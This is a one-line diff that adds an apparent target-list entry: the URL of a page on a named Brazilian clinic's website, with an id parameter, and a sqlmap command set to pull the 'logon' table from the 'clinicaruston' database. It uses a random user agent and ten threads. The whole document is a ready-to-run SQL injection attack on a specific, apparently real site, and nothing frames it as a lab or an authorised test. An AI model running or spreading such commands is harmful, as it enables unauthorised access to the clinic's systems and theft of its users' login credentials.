@@ -1,0 +1,1 @@
+https://www.clinicaruston.com.br/plasticamasculina/releases/viewreleases.php?id=123 (GET)  # sqlmap.py -u https://www.clinicaruston.com.br/plasticamasculina/releases/viewreleases.php?id=123 -D clinicaruston --threads 10 -v3 --random-agent -T logon --dump
